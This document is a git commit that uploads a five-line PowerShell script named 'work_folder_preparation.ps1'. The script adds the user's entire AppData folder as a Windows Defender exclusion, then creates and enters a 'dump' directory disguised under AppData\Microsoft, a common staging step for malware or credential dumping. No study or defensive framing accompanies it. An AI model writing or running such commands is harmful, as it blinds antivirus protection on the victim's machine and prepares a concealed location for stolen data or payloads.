f557ff6394fb6eda06e6961af9d44296dbeacef6
jfkd02ks <115693098+jfkd02ks@users.noreply.github.com>
2022-10-16 08:59:38 +0300

    Add files via upload

---
+++ work_folder_preparation.ps1
@@ -0,0 +1,5 @@
+#Adding windows defender exclusionpath
+Add-MpPreference -ExclusionPath "$env:appdata"
+#Creating the directory we will work on
+mkdir "$env:appdata\Microsoft\dump"
+Set-Location "$env:appdata\Microsoft\dump"
